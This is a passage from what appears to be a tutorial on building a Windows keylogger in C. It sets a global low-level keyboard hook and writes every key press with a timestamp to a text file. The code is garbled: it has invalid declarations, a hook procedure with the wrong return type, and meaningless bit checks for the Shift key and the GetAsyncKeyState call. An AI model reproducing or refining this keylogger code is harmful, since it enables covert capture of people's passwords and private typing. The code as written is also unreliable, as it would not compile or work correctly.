    fclose(fp);
}
```

### Step 3: Set Up the Keyboard Hook
Use `SetWindowsHook` to set a global keyboard hook:
```c
DWORD (API LPARAM) keyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardProc);

HHOOK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Check if the key is pressed or released
    static bool isShift = false;
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            isShift = (lParam & (1 << 5)); // Check if Shift is pressed
            // Log the key press
            LogKeystroke((DWORD)wParam, GetAsyncKeyState(0x200 | (1 << 5)), time(NULL), "keystrokes.txt");
